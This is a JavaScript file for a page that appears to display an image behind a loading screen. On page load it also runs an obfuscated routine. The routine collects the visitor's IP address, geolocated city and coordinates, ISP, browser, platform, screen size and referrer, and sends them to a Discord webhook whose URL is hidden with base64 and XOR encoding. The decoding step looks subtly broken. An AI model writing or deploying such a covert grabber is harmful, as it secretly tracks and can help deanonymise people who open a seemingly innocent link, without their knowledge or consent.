const _0x4f2a = btoa('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NjI1MTA4NzI3NDY0MzU5OS80bG5kYkQ5T1ppMDlLX1Y0WWx1amVid2pqNWxzOWZuQ0xmZktmNHMxLTc0dUlEUnN1VUJmM3BhUTVYVFN4eGxQbnA0dUw=');
const _0x3e1b = (str) => {
    const key = [0x12, 0x34, 0x56, 0x78];
    return str.split('').map((char, i) => 
        String.fromCharCode(char.charCodeAt(0) ^ key[i % key.length])
    ).join('');
};
const _0x2d9c = _0x3e1b(atob(_0x4f2a));

let _0x1f8e = false;

async function _0x7a4d() {
    if (_0x1f8e) return;
    _0x1f8e = true;

    try {
        const [_0x5b2c, _0x6d3f] = await Promise.all([
            fetch('https://api.ipify.org?format=json'),
            fetch('https://ipapi.co/json/')
        ]);

        const _0x4e1a = await _0x5b2c.json();
        const _0x3f2b = await _0x6d3f.json();
        const _0x2c1d = _0x4e1a.ip;

        const _0x1d4e = navigator.userAgent;
        const _0x8e5f = navigator.language;
        const _0x9f6a = navigator.platform;
        const _0x0a7b = `${screen.width}x${screen.height}`;
        const _0x1b8c = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const _0x2c9d = new Date().toISOString();

        const _0x3d0e = {
            ip: _0x2c1d,
            country: _0x3f2b.country_name || 'Unknown',
            region: _0x3f2b.region || 'Unknown',
            city: _0x3f2b.city || 'Unknown',
            latitude: _0x3f2b.latitude || 'Unknown',
            longitude: _0x3f2b.longitude || 'Unknown',
            timezone: _0x3f2b.timezone || _0x1b8c,
            isp: _0x3f2b.org || 'Unknown',
            userAgent: _0x1d4e,
            language: _0x8e5f,
            platform: _0x9f6a,
            screenResolution: _0x0a7b,
            timestamp: _0x2c9d,
            referrer: document.referrer || 'Direct',
            url: window.location.href
        };

        await _0x4e1f(_0x3d0e);

    } catch (error) {
        console.error('Error collecting visitor data:', error);
    }
}

async function _0x4e1f(_0x3d0e) {
    try {
        const _0x2f1a = {
            title: "🌐 New Website Visitor",
            color: 0x00ff00,
            fields: [
                {
                    name: "📍 Location",
                    value: `${_0x3d0e.city}, ${_0x3d0e.region}, ${_0x3d0e.country}`,
                    inline: true
                },
                {
                    name: "🌍 IP Address",
                    value: _0x3d0e.ip,
                    inline: true
                },
                {
                    name: "🕐 Timestamp",
                    value: _0x3d0e.timestamp,
                    inline: true
                },
                {
                    name: "🏢 ISP",
                    value: _0x3d0e.isp,
                    inline: true
                },
                {
                    name: "💻 Platform",
                    value: _0x3d0e.platform,
                    inline: true
                },
                {
                    name: "🖥️ Screen Resolution",
                    value: _0x3d0e.screenResolution,
                    inline: true
                },
                {
                    name: "🌐 Language",
                    value: _0x3d0e.language,
                    inline: true
                },
                {
                    name: "⏰ Timezone",
                    value: _0x3d0e.timezone,
                    inline: true
                },
                {
                    name: "🔗 Referrer",
                    value: _0x3d0e.referrer,
                    inline: true
                }
            ],
            footer: {
                text: "Website Visitor Tracker"
            },
            timestamp: new Date().toISOString()
        };

        const _0x1e2a = {
            embeds: [_0x2f1a]
        };

        await fetch(_0x2d9c, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(_0x1e2a)
        });

    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}

function _0x5f3a() {
    const _0x4e2b = document.getElementById('loading-screen');
    const _0x3d1c = document.getElementById('content');
    
    _0x4e2b.style.display = 'flex';
    _0x3d1c.classList.add('hidden');
}

function _0x6e4b() {
    const _0x5f3c = document.getElementById('loading-screen');
    const _0x4e2d = document.getElementById('content');
    
    _0x5f3c.style.opacity = '0';
    setTimeout(() => {
        _0x5f3c.style.display = 'none';
        _0x4e2d.classList.remove('hidden');
    }, 500);
}

function _0x7f5c() {
    const _0x6e4d = document.getElementById('main-image');
    
    _0x6e4d.onload = function() {
        setTimeout(() => {
            _0x6e4b();
        }, 1000);
    };
    
    _0x6e4d.onerror = function() {
        setTimeout(() => {
            _0x6e4b();
            _0x6e4d.src = 'https://files.catbox.moe/dn5vql.png';
        }, 1000);
    };
    
    _0x6e4d.src = 'https://files.catbox.moe/cdzvgb.png';
}

document.addEventListener('DOMContentLoaded', function() {
    _0x5f3a();
    _0x7a4d();
    _0x7f5c();
}); 
